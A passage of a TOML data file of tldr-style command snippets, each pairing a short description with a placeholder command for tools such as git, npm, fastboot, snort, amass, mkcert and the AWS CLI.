  description = "Add the executables for a specific platform"
  command = "sudo tlmgr platform add <platform>"
  output = ""

[[snippets]]
  description = "Remove the executables for a specific platform"
  command = "sudo tlmgr platform remove <platform>"
  output = ""

[[snippets]]
  description = "Auto-detect and switch to the current platform"
  command = "sudo tlmgr platform set auto"
  output = ""

[[snippets]]
  description = "Switch to a specific platform"
  command = "sudo tlmgr platform set <platform>"
  output = ""

[[snippets]]
  description = "Display the names and values of shell variables"
  command = "set"
  output = ""

[[snippets]]
  description = "Export newly initialized variables to child processes"
  command = "set -a"
  output = ""

[[snippets]]
  description = "Write formatted messages to `stderr` when jobs finish"
  command = "set -b"
  output = ""

[[snippets]]
  description = "Write and edit text in the command line with `vi`-like keybindings (e.g. `yy`)"
  command = "set -o <vi>"
  output = ""

[[snippets]]
  description = "Exit the shell when (some) commands fail"
  command = "set -e"
  output = ""

[[snippets]]
  description = "Show only the file name from a path"
  command = "basename <path/to/file>"
  output = ""

[[snippets]]
  description = "Show only the rightmost directory name from a path"
  command = "basename <path/to/directory/>"
  output = ""

[[snippets]]
  description = "Show only the file name from a path, with a suffix removed"
  command = "basename <path/to/file> <suffix>"
  output = ""

[[snippets]]
  description = "Make an XML document canonical, preserving comments"
  command = "xml canonic <path/to/input.xml|URI> > <path/to/output.xml>"
  output = ""

[[snippets]]
  description = "Make an XML document canonical, removing comments"
  command = "xml canonic --without-comments <path/to/input.xml|URI> > <path/to/output.xml>"
  output = ""

[[snippets]]
  description = "Make XML exclusively canonical, using an XPATH from a file, preserving comments"
  command = "xml canonic --exc-with-comments <path/to/input.xml|URI> <path/to/c14n.xpath>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "xml canonic --help"
  output = ""

[[snippets]]
  description = "List accessible devices"
  command = "duf"
  output = ""

[[snippets]]
  description = "List everything (such as pseudo, duplicate or inaccessible file systems)"
  command = "duf --all"
  output = ""

[[snippets]]
  description = "Only show specified devices or mount points"
  command = "duf <path/to/directory1 path/to/directory2 ...>"
  output = ""

[[snippets]]
  description = "Sort the output by a specified criteria"
  command = "duf --sort <size|used|avail|usage>"
  output = ""

[[snippets]]
  description = "Generate the histogram for human reading"
  command = "ppmhist -nomap <path/to/image.ppm>"
  output = ""

[[snippets]]
  description = "Generate a PPM file of the colormap for the image, with the color histogram as comments"
  command = "ppmhist -map <path/to/image.ppm>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "ppmhist -version"
  output = ""

[[snippets]]
  description = "Start the interactive TUI"
  command = "ghcup tui"
  output = ""

[[snippets]]
  description = "List available GHC/cabal versions"
  command = "ghcup list"
  output = ""

[[snippets]]
  description = "Install the recommended GHC version"
  command = "ghcup install ghc"
  output = ""

[[snippets]]
  description = "Install a specific GHC version"
  command = "ghcup install ghc <version>"
  output = ""

[[snippets]]
  description = "Set the currently "active" GHC version"
  command = "ghcup set ghc <version>"
  output = ""

[[snippets]]
  description = "Install cabal-install"
  command = "ghcup install cabal"
  output = ""

[[snippets]]
  description = "Update `ghcup` itself"
  command = "ghcup upgrade"
  output = ""

[[snippets]]
  description = "Measure the current download speed"
  command = "fast"
  output = ""

[[snippets]]
  description = "Measure the current upload speed in addition to download speed"
  command = "fast --upload"
  output = ""

[[snippets]]
  description = "Display results on a single line to reduce spacing"
  command = "fast --single-line"
  output = ""

[[snippets]]
  description = "Look up a character by its value"
  command = "chars '<ß>'"
  output = ""

[[snippets]]
  description = "Look up a character by its Unicode code point"
  command = "chars <U+1F63C>"
  output = ""

[[snippets]]
  description = "Look up possible characters given an ambiguous code point"
  command = "chars <10>"
  output = ""

[[snippets]]
  description = "Look up a control character"
  command = "chars ""<^C>"""
  output = ""

[[snippets]]
  description = "Unstage everything"
  command = "git reset"
  output = ""

[[snippets]]
  description = "Unstage specific file(s)"
  command = "git reset <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Interactively unstage portions of a file"
  command = "git reset --patch <path/to/file>"
  output = ""

[[snippets]]
  description = "Undo the last commit, keeping its changes (and any further uncommitted changes) in the filesystem"
  command = "git reset HEAD~"
  output = ""

[[snippets]]
  description = "Undo the last two commits, adding their changes to the index, i.e. staged for commit"
  command = "git reset --soft HEAD~2"
  output = ""

[[snippets]]
  description = "Discard any uncommitted changes, staged or not (for only unstaged changes, use `git checkout`)"
  command = "git reset --hard"
  output = ""

[[snippets]]
  description = "Reset the repository to a given commit, discarding committed, staged and uncommitted changes since then"
  command = "git reset --hard <commit>"
  output = ""

[[snippets]]
  description = "Generate a new public/private key pair"
  command = "light-arionum-cli"
  output = ""

[[snippets]]
  description = "Display the balance of the current address"
  command = "light-arionum-cli balance"
  output = ""

[[snippets]]
  description = "Display the balance of the specified address"
  command = "light-arionum-cli balance <address>"
  output = ""

[[snippets]]
  description = "Send a transaction with an optional message"
  command = "light-arionum-cli send <address> <value> <optional_message>"
  output = ""

[[snippets]]
  description = "Export the current wallet information"
  command = "light-arionum-cli export"
  output = ""

[[snippets]]
  description = "Display information about the current block"
  command = "light-arionum-cli block"
  output = ""

[[snippets]]
  description = "Display information about the current address' transactions"
  command = "light-arionum-cli transactions"
  output = ""

[[snippets]]
  description = "Display information about a specific transaction"
  command = "light-arionum-cli transaction <transaction_id>"
  output = ""

[[snippets]]
  description = "Start Qt Creator"
  command = "qtcreator"
  output = ""

[[snippets]]
  description = "Start Qt Creator and restore the last session"
  command = "qtcreator -lastsession"
  output = ""

[[snippets]]
  description = "Start Qt Creator but don't load the specified plugin"
  command = "qtcreator -noload <plugin>"
  output = ""

[[snippets]]
  description = "Start Qt Creator but don't load any plugins"
  command = "qtcreator -noload <all>"
  output = ""

[[snippets]]
  description = "Start Qt Creator in presentation mode with pop-ups for keyboard shortcuts"
  command = "qtcreator -presentationMode"
  output = ""

[[snippets]]
  description = "Start Qt Creator and show the diff from a specific commit"
  command = "qtcreator -git-show <commit>"
  output = ""

[[snippets]]
  description = "Show example usage of a command"
  command = "cheat <command>"
  output = ""

[[snippets]]
  description = "Edit the cheat sheet for a command"
  command = "cheat -e <command>"
  output = ""

[[snippets]]
  description = "List the available cheat sheets"
  command = "cheat -l"
  output = ""

[[snippets]]
  description = "Search available the cheat sheets for a specified command name"
  command = "cheat -s <command>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "cheat -v"
  output = ""

[[snippets]]
  description = "Start a stopwatch"
  command = "termdown"
  output = ""

[[snippets]]
  description = "Start a 1 minute and 30 seconds countdown"
  command = "termdown <1m30s>"
  output = ""

[[snippets]]
  description = "Start a 1 minute 30 seconds countdown with blinking the terminal at the end"
  command = "termdown <1m30s> --blink"
  output = ""

[[snippets]]
  description = "Show a title above countdown"
  command = "termdown <1m30s> --title ""<Interesting title>"""
  output = ""

[[snippets]]
  description = "Display current time"
  command = "termdown --time"
  output = ""

[[snippets]]
  description = "Insert an additional author to the last Git commit"
  command = "git coauthor <name> <name@example.com>"
  output = ""

[[snippets]]
  description = "Search for lines beginning with a specific prefix in a specific file"
  command = "look <prefix> <path/to/file>"
  output = ""

[[snippets]]
  description = "Case-insensitively ([f]) search only on alphanumeric characters ([d])"
  command = "look -f -d <prefix> <path/to/file>"
  output = ""

[[snippets]]
  description = "Specify a string [t]ermination character (space by default)"
  command = "look -t <,>"
  output = ""

[[snippets]]
  description = "Search in `/usr/share/dict/words` (`-d` and `-f` are assumed)"
  command = "look <prefix>"
  output = ""

[[snippets]]
  description = "Ask Betty something"
  command = "betty <what time is it>"
  output = ""

[[snippets]]
  description = "Download a file"
  command = "betty download <https://example.com/file.ext> to <path/to/output_file.ext>"
  output = ""

[[snippets]]
  description = "Compress a file or directory to one of the support archive formats"
  command = "betty <zip> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Extract an archive into the current directory"
  command = "betty <unzip> <archive.tar.gz>"
  output = ""

[[snippets]]
  description = "Extract an archive into a specific directory"
  command = "betty unarchive <archive.tar.gz> to <path/to/directory>"
  output = ""

[[snippets]]
  description = "Play Spotify"
  command = "betty play <Spotify>"
  output = ""

[[snippets]]
  description = "Drive Betty to madness"
  command = "betty go crazy"
  output = ""

[[snippets]]
  description = "Display version"
  command = "betty version"
  output = ""

[[snippets]]
  description = "Run a `doctl databases options` command with an access token"
  command = "doctl databases options <command> --access-token <access_token>"
  output = ""

[[snippets]]
  description = "Retrieve a list of the available database engines"
  command = "doctl databases options engines"
  output = ""

[[snippets]]
  description = "Retrieve a list of the available regions for a given database engine"
  command = "doctl databases options regions --engine <pg|mysql|redis|mongodb>"
  output = ""

[[snippets]]
  description = "Retrieve a list of the available slugs for a given database engine"
  command = "doctl databases options slugs --engine <pg|mysql|redis|mongodb>"
  output = ""

[[snippets]]
  description = "Retrieve a list of the available versions for a given database engine"
  command = "doctl databases options versions --engine <pg|mysql|redis|mongodb>"
  output = ""

[[snippets]]
  description = "Put a file or directory under version control, so it will be in the current checkout"
  command = "fossil add <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Remove all added files from the current checkout"
  command = "fossil add --reset"
  output = ""

[[snippets]]
  description = "List all supported ID3v2.3 or ID3v2.4 frames and their meanings"
  command = "id3v2 --list-frames <path/to/file1.mp3 path/to/file2.mp3 ...>"
  output = ""

[[snippets]]
  description = "List all supported ID3v1 numeric genres"
  command = "id3v2 --list-genres <path/to/file1.mp3 path/to/file2.mp3 ...>"
  output = ""

[[snippets]]
  description = "List all tags in specific files"
  command = "id3v2 --list <path/to/file1.mp3 path/to/file2.mp3 ...>"
  output = ""

[[snippets]]
  description = "Set specific artist, album, or song information"
  command = "id3v2 <--artist|--album|--song>=<string> <path/to/file1.mp3 path/to/file2.mp3 ...>"
  output = ""

[[snippets]]
  description = "Set specific picture information"
  command = "id3v2 --picture=<filename:description:image_type:mime_type> <path/to/file1.mp3 path/to/file2.mp3 ...>"
  output = ""

[[snippets]]
  description = "Set specific year information"
  command = "id3v2 --year=<YYYY> <path/to/file1.mp3 path/to/file2.mp3 ...>"
  output = ""

[[snippets]]
  description = "Set specific date information"
  command = "id3v2 --date=<YYYY-MM-DD> <path/to/file1.mp3 path/to/file2.mp3 ...>"
  output = ""

[[snippets]]
  description = "Scan a network for NetBIOS names"
  command = "nbtscan <192.168.0.1/24>"
  output = ""

[[snippets]]
  description = "Scan a single IP address"
  command = "nbtscan <192.168.0.1>"
  output = ""

[[snippets]]
  description = "Display verbose output"
  command = "nbtscan -v <192.168.0.1/24>"
  output = ""

[[snippets]]
  description = "Display output in `/etc/hosts` format"
  command = "nbtscan -e <192.168.0.1/24>"
  output = ""

[[snippets]]
  description = "Read IP addresses/networks to scan from a file"
  command = "nbtscan -f <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "Launch ranger"
  command = "ranger"
  output = ""

[[snippets]]
  description = "Show only directories"
  command = "ranger --show-only-dirs"
  output = ""

[[snippets]]
  description = "Change the configuration directory"
  command = "ranger --confdir=<path/to/directory>"
  output = ""

[[snippets]]
  description = "Change the data directory"
  command = "ranger --datadir=<path/to/directory>"
  output = ""

[[snippets]]
  description = "Print CPU usage statistics on exit"
  command = "ranger --profile"
  output = ""

[[snippets]]
  description = "Start `supervisord` with specified configuration file"
  command = "supervisord -c <path/to/file>"
  output = ""

[[snippets]]
  description = "Run supervisord in the foreground"
  command = "supervisord -n"
  output = ""

[[snippets]]
  description = "Combine labels equal in their high-order bits"
  command = "ipaggmanip --prefix <16> <path/to/file>"
  output = ""

[[snippets]]
  description = "Remove labels with a count smaller than a given number of bytes and output a random sample of such labels"
  command = "ipaggmanip --cut-smaller <100> --cull-labels <5> <path/to/file>"
  output = ""

[[snippets]]
  description = "Replace each label's count with 1 if it is non-zero"
  command = "ipaggmanip --posterize <path/to/file>"
  output = ""

[[snippets]]
  description = "List available domains for your AWS account"
  command = "aws codeartifact list-domains"
  output = ""

[[snippets]]
  description = "Generate credentials for a specific package manager"
  command = "aws codeartifact login --tool <npm|pip|twine> --domain <your_domain> --repository <repository_name>"
  output = ""

[[snippets]]
  description = "Get the endpoint URL of a CodeArtifact repository"
  command = "aws codeartifact get-repository-endpoint --domain <your_domain> --repository <repository_name> --format <npm|pypi|maven|nuget|generic>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "aws codeartifact help"
  output = ""

[[snippets]]
  description = "Display help for a specific subcommand"
  command = "aws codeartifact <subcommand> help"
  output = ""

[[snippets]]
  description = "Select all elements matching "XPATH1" and print the value of their sub-element "XPATH2""
  command = "xml select --template --match ""<XPATH1>"" --value-of ""<XPATH2>"" <path/to/input.xml|URI>"
  output = ""

[[snippets]]
  description = "Match "XPATH1" and print the value of "XPATH2" as text with new-lines"
  command = "xml select --text --template --match ""<XPATH1>"" --value-of ""<XPATH2>"" --nl <path/to/input.xml|URI>"
  output = ""

[[snippets]]
  description = "Count the elements of "XPATH1""
  command = "xml select --template --value-of ""count(<XPATH1>)"" <path/to/input.xml|URI>"
  output = ""

[[snippets]]
  description = "Count all nodes in one or more XML documents"
  command = "xml select --text --template --inp-name --output "" "" --value-of ""count(node())"" --nl <path/to/input1.xml|URI> <path/to/input2.xml|URI>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "xml select --help"
  output = ""

[[snippets]]
  description = "Start an interactive session"
  command = "octave"
  output = ""

[[snippets]]
  description = "Execute a specific script file"
  command = "octave <path/to/script.m>"
  output = ""

[[snippets]]
  description = "Execute a script file with specific arguments"
  command = "octave <path/to/script.m> <argument1 argument2 ...>"
  output = ""

[[snippets]]
  description = "Start an interactive session with a GUI"
  command = "octave --gui"
  output = ""

[[snippets]]
  description = "Display help"
  command = "octave --help"
  output = ""

[[snippets]]
  description = "Display version"
  command = "octave --version"
  output = ""

[[snippets]]
  description = "Add a single target file to the index"
  command = "dvc add <path/to/file>"
  output = ""

[[snippets]]
  description = "Add a target directory to the index"
  command = "dvc add <path/to/directory>"
  output = ""

[[snippets]]
  description = "Recursively add all the files in a given target directory"
  command = "dvc add --recursive <path/to/directory>"
  output = ""

[[snippets]]
  description = "Add a target file with a custom `.dvc` filename"
  command = "dvc add --file <custom_name.dvc> <path/to/file>"
  output = ""

[[snippets]]
  description = "Search for a query on Google (default provider)"
  command = "s <query>"
  output = ""

[[snippets]]
  description = "List all providers"
  command = "s --list-providers"
  output = ""

[[snippets]]
  description = "Search for a query with a given provider"
  command = "s --provider <provider> <query>"
  output = ""

[[snippets]]
  description = "Use a specified binary to perform the search query"
  command = "s --binary ""<binary> <arguments>"" <query>"
  output = ""

[[snippets]]
  description = "Find root domains in an IP address range"
  command = "amass intel -addr <192.168.0.1-254>"
  output = ""

[[snippets]]
  description = "Use active recon methods"
  command = "amass intel -active -addr <192.168.0.1-254>"
  output = ""

[[snippets]]
  description = "Find root domains related to a [d]omain"
  command = "amass intel -whois -d <domain_name>"
  output = ""

[[snippets]]
  description = "Find ASNs belonging to an organisation"
  command = "amass intel -org <organisation_name>"
  output = ""

[[snippets]]
  description = "Find root domains belonging to a given Autonomous System Number"
  command = "amass intel -asn <asn>"
  output = ""

[[snippets]]
  description = "Save results to a text file"
  command = "amass intel -o <output_file> -whois -d <domain_name>"
  output = ""

[[snippets]]
  description = "View a presentation"
  command = "tpp <path/to/file>"
  output = ""

[[snippets]]
  description = "Output a presentation"
  command = "tpp -t <type> -o <path/to/output> <path/to/file>"
  output = ""

[[snippets]]
  description = "Compare DVC tracked files from different Git commits, tags, and branches w.r.t the current workspace"
  command = "dvc diff <commit_hash/tag/branch>"
  output = ""

[[snippets]]
  description = "Compare the changes in DVC tracked files from 1 Git commit to another"
  command = "dvc diff <revision1> <revision2>"
  output = ""

[[snippets]]
  description = "Compare DVC tracked files, along with their latest hash"
  command = "dvc diff --show-hash <commit>"
  output = ""

[[snippets]]
  description = "Compare DVC tracked files, displaying the output as JSON"
  command = "dvc diff --show-json --show-hash <commit>"
  output = ""

[[snippets]]
  description = "Compare DVC tracked files, displaying the output as Markdown"
  command = "dvc diff --show-md --show-hash <commit>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr clang++"
  output = ""

[[snippets]]
  description = "Launch the word processor application"
  command = "calligrawords"
  output = ""

[[snippets]]
  description = "Open a specific document"
  command = "calligrawords <path/to/document>"
  output = ""

[[snippets]]
  description = "Display help or version"
  command = "calligrawords --<help|version>"
  output = ""

[[snippets]]
  description = "Convert a Zeiss cofocal file into either `.pgm` or `.ppm` format"
  command = "zeisstopnm <path/to/file>"
  output = ""

[[snippets]]
  description = "Convert a Zeiss cofocal file to Netbpm format while explicitly specifying the target file type"
  command = "zeisstopnm -<pgm|ppm> <path/to/file>"
  output = ""

[[snippets]]
  description = "Start Pinta"
  command = "pinta"
  output = ""

[[snippets]]
  description = "Open specific files"
  command = "pinta <path/to/image1 path/to/image2 ...>"
  output = ""

[[snippets]]
  description = "Convert a TIFF to a PNM file"
  command = "tifftopnm <path/to/input_file.tiff> > <path/to/output_file.pnm>"
  output = ""

[[snippets]]
  description = "Create a PGM file containing the alpha channel of the input image"
  command = "tifftopnm -alphaout <path/to/alpha_file.pgm> <path/to/input_file.tiff> > <path/to/output_file.pnm>"
  output = ""

[[snippets]]
  description = "Respect the `fillorder` tag in the input TIFF image"
  command = "tifftopnm -respectfillorder <path/to/input_file.tiff> > <path/to/output_file.pnm>"
  output = ""

[[snippets]]
  description = "Print TIFF header information to `stderr`"
  command = "tifftopnm -headerdump <path/to/input_file.tiff> > <path/to/output_file.pnm>"
  output = ""

[[snippets]]
  description = "Convert the data from several `warts` files into one `pcap` file"
  command = "sc_warts2pcap -o <path/to/output.pcap> <path/to/file1.warts path/to/file2.warts ...>"
  output = ""

[[snippets]]
  description = "Convert the data from a `warts` file into a `pcap` file and sort the packets by timestamp"
  command = "sc_warts2pcap -s -o <path/to/output.pcap> <path/to/file.warts>"
  output = ""

[[snippets]]
  description = "Capture packets with verbose output"
  command = "sudo snort -v -i <interface>"
  output = ""

[[snippets]]
  description = "Capture packets and dump application layer data with verbose output"
  command = "sudo snort -vd -i <interface>"
  output = ""

[[snippets]]
  description = "Capture packets and display link layer packet headers with verbose output"
  command = "sudo snort -ve -i <interface>"
  output = ""

[[snippets]]
  description = "Capture packets and save them in the specified directory"
  command = "sudo snort -i <interface> -l <path/to/directory>"
  output = ""

[[snippets]]
  description = "Capture packets according to rules and save offending packets along with alerts"
  command = "sudo snort -i <interface> -c <path/to/rules.conf> -l <path/to/directory>"
  output = ""

[[snippets]]
  description = "Extract all files/directories from specific archives into the current directory"
  command = "unzip <path/to/archive1.zip path/to/archive2.zip ...>"
  output = ""

[[snippets]]
  description = "Extract files/directories from archives to a specific path"
  command = "unzip <path/to/archive1.zip path/to/archive2.zip ...> -d <path/to/output>"
  output = ""

[[snippets]]
  description = "Extract files/directories from archives to `stdout`"
  command = "unzip -c <path/to/archive1.zip path/to/archive2.zip ...>"
  output = ""

[[snippets]]
  description = "Extract the contents of the file(s) to `stdout` alongside the extracted file names"
  command = "unzip -O <gbk> <path/to/archive1.zip path/to/archive2.zip ...>"
  output = ""

[[snippets]]
  description = "List the contents of a specific archive without extracting them"
  command = "unzip -l <path/to/archive.zip>"
  output = ""

[[snippets]]
  description = "Extract a specific file from an archive"
  command = "unzip -j <path/to/archive.zip> <path/to/file_in_archive1 path/to/file_in_archive2 ...>"
  output = ""

[[snippets]]
  description = "Install the local CA in the system trust store"
  command = "mkcert -install"
  output = ""

[[snippets]]
  description = "Generate certificate and private key for a given domain"
  command = "mkcert <example.org>"
  output = ""

[[snippets]]
  description = "Generate certificate and private key for multiple domains"
  command = "mkcert <example.org> <myapp.dev> <127.0.0.1>"
  output = ""

[[snippets]]
  description = "Generate wildcard certificate and private key for a given domain and its subdomains"
  command = "mkcert ""<*.example.it>"""
  output = ""

[[snippets]]
  description = "Uninstall the local CA"
  command = "mkcert -uninstall"
  output = ""

[[snippets]]
  description = "Commit staged files to the repository"
  command = "hg commit"
  output = ""

[[snippets]]
  description = "Commit a specific file or directory"
  command = "hg commit <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Commit with a specific message"
  command = "hg commit --message <message>"
  output = ""

[[snippets]]
  description = "Commit all files matching a specified pattern"
  command = "hg commit --include <pattern>"
  output = ""

[[snippets]]
  description = "Commit all files, excluding those that match a specified pattern"
  command = "hg commit --exclude <pattern>"
  output = ""

[[snippets]]
  description = "Commit using the interactive mode"
  command = "hg commit --interactive"
  output = ""

[[snippets]]
  description = "Create a new receipt rule set"
  command = "aws ses create-receipt-rule-set --rule-set-name <rule_set_name> --generate-cli-skeleton"
  output = ""

[[snippets]]
  description = "Describe the active receipt rule set"
  command = "aws ses describe-active-receipt-rule-set --generate-cli-skeletion"
  output = ""

[[snippets]]
  description = "Describe a specific receipt rule"
  command = "aws ses describe-receipt-rule --rule-set-name <rule_set_name> --rule-name <rule_name> --generate-cli-skeleton"
  output = ""

[[snippets]]
  description = "List all receipt rule sets"
  command = "aws ses list-receipt-rule-sets --starting-token <token_string> --max-items <integer> --generate-cli-skeleton"
  output = ""

[[snippets]]
  description = "Delete a specific receipt rule set (the currently active rule set cannot be deleted)"
  command = "aws ses delete-receipt-rule-set --rule-set-name <rule_set_name> --generate-cli-skeleton"
  output = ""

[[snippets]]
  description = "Delete a specific receipt rule"
  command = "aws ses delete-receipt-rule --rule-set-name <rule_set_name> --rule-name <rule_name> --generate-cli-skeleton"
  output = ""

[[snippets]]
  description = "Send an email"
  command = "aws ses send-email --from <from_address> --destination ""ToAddresses=<addresses>"" --message ""Subject={Data=<subject_text>,Charset=utf8},Body={Text={Data=<body_text>,Charset=utf8},Html={Data=<message_body_containing_html>,Charset=utf8>"""
  output = ""

[[snippets]]
  description = "Display help for a specific SES subcommand"
  command = "aws ses <subcommand> help"
  output = ""

[[snippets]]
  description = "Escape special XML characters in a string"
  command = "xml escape ""<<a1>>"""
  output = ""

[[snippets]]
  description = "Escape special XML characters from `stdin`"
  command = "echo ""<<a1>>"" | xml escape"
  output = ""

[[snippets]]
  description = "Display help"
  command = "xml escape --help"
  output = ""

[[snippets]]
  description = "Run gource in a directory (if it isn't the repository's root directory, the root is sought up from there)"
  command = "gource <path/to/repository>"
  output = ""

[[snippets]]
  description = "Run gource in the current directory, with a custom output resolution"
  command = "gource -<width>x<height>"
  output = ""

[[snippets]]
  description = "Specify the timescale for the animation"
  command = "gource -c <time_scale_multiplier>"
  output = ""

[[snippets]]
  description = "Specify how long each day should be in the animation (this combines with -c, if provided)"
  command = "gource -s <seconds>"
  output = ""

[[snippets]]
  description = "Use fullscreen mode and a custom background color"
  command = "gource -f -b <hex_color_code>"
  output = ""

[[snippets]]
  description = "Specify the animation title"
  command = "gource --title <title>"
  output = ""

[[snippets]]
  description = "List all Cloud9 development environment identifiers"
  command = "aws cloud9 list-environments"
  output = ""

[[snippets]]
  description = "Create a Cloud9 development environment"
  command = "aws cloud9 create-environment-ec2 --name <name> --instance-type <instance_type>"
  output = ""

[[snippets]]
  description = "Display information about Cloud9 development environments"
  command = "aws cloud9 describe-environments --environment-ids <environment_ids>"
  output = ""

[[snippets]]
  description = "Add an environment member to a Cloud9 development environment"
  command = "aws cloud9 create-environment-membership --environment-id <environment_id> --user-arn <user_arn> --permissions <permissions>"
  output = ""

[[snippets]]
  description = "Display status information for a Cloud9 development environment"
  command = "aws cloud9 describe-environment-status --environment-id <environment_id>"
  output = ""

[[snippets]]
  description = "Delete a Cloud9 environment"
  command = "aws cloud9 delete-environment --environment-id <environment_id>"
  output = ""

[[snippets]]
  description = "Delete an environment member from a development environment"
  command = "aws cloud9 delete-environment-membership --environment-id <environment_id> --user-arn <user_arn>"
  output = ""

[[snippets]]
  description = "Build an image"
  command = "packer build <path/to/config.json>"
  output = ""

[[snippets]]
  description = "Check the syntax of a Packer image config"
  command = "packer validate <path/to/config.json>"
  output = ""

[[snippets]]
  description = "Format a Packer image config"
  command = "packer fmt <path/to/config.pkr.hcl>"
  output = ""

[[snippets]]
  description = "Generate one passphrase with the default options"
  command = "xkcdpass"
  output = ""

[[snippets]]
  description = "Generate one passphrase whose first letters of each word match the provided argument"
  command = "xkcdpass -a <acrostic>"
  output = ""

[[snippets]]
  description = "Generate passwords interactively"
  command = "xkcdpass -i"
  output = ""

[[snippets]]
  description = "Interactively create a `package.json` file"
  command = "npm init"
  output = ""

[[snippets]]
  description = "Download all the packages listed as dependencies in `package.json`"
  command = "npm install"
  output = ""

[[snippets]]
  description = "Download a specific version of a package and add it to the list of dependencies in `package.json`"
  command = "npm install <package_name>@<version>"
  output = ""

[[snippets]]
  description = "Download the latest version of a package and add it to the list of dev dependencies in `package.json`"
  command = "npm install <package_name> --save-dev"
  output = ""

[[snippets]]
  description = "Download the latest version of a package and install it globally"
  command = "npm install --global <package_name>"
  output = ""

[[snippets]]
  description = "Uninstall a package and remove it from the list of dependencies in `package.json`"
  command = "npm uninstall <package_name>"
  output = ""

[[snippets]]
  description = "List of locally installed dependencies"
  command = "npm list"
  output = ""

[[snippets]]
  description = "List top-level globally installed packages"
  command = "npm list --global --depth=<0>"
  output = ""

[[snippets]]
  description = "Unlock the bootloader"
  command = "fastboot oem unlock"
  output = ""

[[snippets]]
  description = "Relock the bootloader"
  command = "fastboot oem lock"
  output = ""

[[snippets]]
  description = "Reboot the device from fastboot mode into fastboot mode again"
  command = "fastboot reboot bootloader"
  output = ""

[[snippets]]
  description = "Flash a given image"
  command = "fastboot flash <path/to/file.img>"
  output = ""

[[snippets]]
  description = "Flash a custom recovery image"
  command = "fastboot flash recovery <path/to/file.img>"
  output = ""

[[snippets]]
  description = "Display connected devices"
  command = "fastboot devices"
  output = ""

[[snippets]]
  description = "Display all information of a device"
  command = "fastboot getvar all"
  output = ""

[[snippets]]
  description = "Test the given amount of memory (in Megabytes)"
  command = "stressapptest -M <memory>"
  output = ""

[[snippets]]
  description = "Test memory as well as I/O for the given file"
  command = "stressapptest -M <memory> -f <path/to/file>"
  output = ""

[[snippets]]
  description = "Test specifying the verbosity level, where 0=lowest, 20=highest, 8=default"
  command = "stressapptest -M <memory> -v <level>"
  output = ""

[[snippets]]
  description = "Dump a guest virtual machine into the default dump directory (usually `/var/lib/vz/dump/`), excluding snapshots"
  command = "vzdump <vm_id>"
  output = ""

[[snippets]]
  description = "Back up the guest virtual machines with the IDs 101, 102, and 103"
  command = "vzdump <101 102 103>"
  output = ""

[[snippets]]
  description = "Dump a guest virtual machine using a specific mode"
  command = "vzdump <vm_id> --mode <suspend|snapshot>"
  output = ""

[[snippets]]
  description = "Back up all guest systems and send an notification email to the root and admin users"
  command = "vzdump --all --mode <suspend> --mailto <root> --mailto <admin>"
  output = ""

[[snippets]]
  description = "Use snapshot mode (no downtime required) and a non-default dump directory"
  command = "vzdump <vm_id> --dumpdir <path/to/directory> --mode <snapshot>"
  output = ""

[[snippets]]
  description = "Back up all guest virtual machines excluding the IDs 101 and 102"
  command = "vzdump --mode <suspend> --exclude <101, 102>"
  output = ""

[[snippets]]
  description = "Show the reflog for HEAD"
  command = "git reflog"
  output = ""

[[snippets]]
  description = "Show the reflog for a given branch"
  command = "git reflog <branch_name>"
  output = ""

[[snippets]]
  description = "Show only the 5 latest entries in the reflog"
  command = "git reflog -n <5>"
  output = ""

[[snippets]]
  description = "Convert an STL file to a GTS file"
  command = "stl2gts < <path/to/file.stl> > <path/to/file.gts>"
  output = ""

[[snippets]]
  description = "Convert an STL file to a GTS file and revert face normals"
  command = "stl2gts --revert < <path/to/file.stl> > <path/to/file.gts>"
  output = ""

[[snippets]]
  description = "Convert an STL file to a GTS file and do not merge vertices"
  command = "stl2gts --nomerge < <path/to/file.stl> > <path/to/file.gts>"
  output = ""

[[snippets]]
  description = "Convert an STL file to a GTS file and display surface statistics"
  command = "stl2gts --verbose < <path/to/file.stl> > <path/to/file.gts>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "stl2gts --help"
  output = ""

[[snippets]]
  description = "Execute 100 HTTP GET requests to a given URL"
  command = "ab -n 100 <url>"
  output = ""

[[snippets]]
  description = "Execute 100 HTTP GET requests, in concurrent batches of 10, to a URL"
  command = "ab -n 100 -c 10 <url>"
  output = ""

[[snippets]]
  description = "Execute 100 HTTP POST requests to a URL, using a JSON payload from a file"
  command = "ab -n 100 -T <application/json> -p <path/to/file.json> <url>"
  output = ""

[[snippets]]
  description = "Use HTTP [k]eep-Alive, i.e. perform multiple requests within one HTTP session"
  command = "ab -k <url>"
  output = ""

[[snippets]]
  description = "Set the maximum number of seconds ([t]imeout) to spend for benchmarking (30 by default)"
  command = "ab -t <60> <url>"
  output = ""

[[snippets]]
  description = "Write the results to a CSV file"
  command = "ab -e <path/to/file.csv>"
  output = ""

[[snippets]]
  description = "Download the daily offer book into the current directory with the specified book format (defaults to `pdf`)"
  command = "packtpub download --type <pdf|ebup|mobi>"
  output = ""

[[snippets]]
  description = "Download the daily offer book into the specified directory"
  command = "packtpub download --dir <path/to/directory>"
  output = ""

[[snippets]]
  description = "Start an interactive login to packtpub.com"
  command = "packtpub login"
  output = ""

[[snippets]]
  description = "Log out from packtpub.com"
  command = "packtpub logout"
  output = ""

[[snippets]]
  description = "Display the daily offer"
  command = "packtpub view-offer"
  output = ""

[[snippets]]
  description = "Open the daily offer in the default web browser"
  command = "packtpub view-offer"
  output = ""

[[snippets]]
  description = "Display the currently logged-in user"
  command = "packtpub whoami"
  output = ""

[[snippets]]
  description = "Convert from CSV to TSV"
  command = "csv2tsv <path/to/input_csv1 path/to/input_csv2 ...> > <path/to/output_tsv>"
  output = ""

[[snippets]]
  description = "Convert field delimiter separated CSV to TSV"
  command = "csv2tsv -c'<field_delimiter>' <path/to/input_csv>"
  output = ""

[[snippets]]
  description = "Convert semicolon separated CSV to TSV"
  command = "csv2tsv -c';' <path/to/input_csv>"
  output = ""

[[snippets]]
  description = "Create a GPG public and private key interactively"
  command = "gpg --full-generate-key"
  output = ""

